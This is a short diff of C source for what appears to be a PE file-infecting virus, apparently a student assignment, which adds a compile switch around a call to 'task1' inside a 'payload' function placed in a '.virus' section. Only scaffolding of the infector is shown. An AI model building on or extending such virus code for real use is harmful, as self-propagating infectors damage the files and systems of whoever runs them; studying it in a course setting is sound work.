@@ -9,6 +9,8 @@
 // #define KERNEL32_DLL 3
 // #define CURRENT_EXE 1
 
+#define DO_TASK1 1
+
 #define NAME_OF_NEW_FILE "2021302181087"
 #define V_SECT_NAME ".virus"
 #define SET_SECT __attribute__((section(V_SECT_NAME)))
@@ -119,9 +121,10 @@ void payload(void)
     // "global" variables
     char v_sect_name[] = V_SECT_NAME;
 
-    // 
+#if DO_TASK1
     CALL(task1);
     task1_ret: asm("nop");
+#endif
 
     //  calculating in-file offset of instruction mov /(rva)/, %%rax
     DWORD offset = 0;
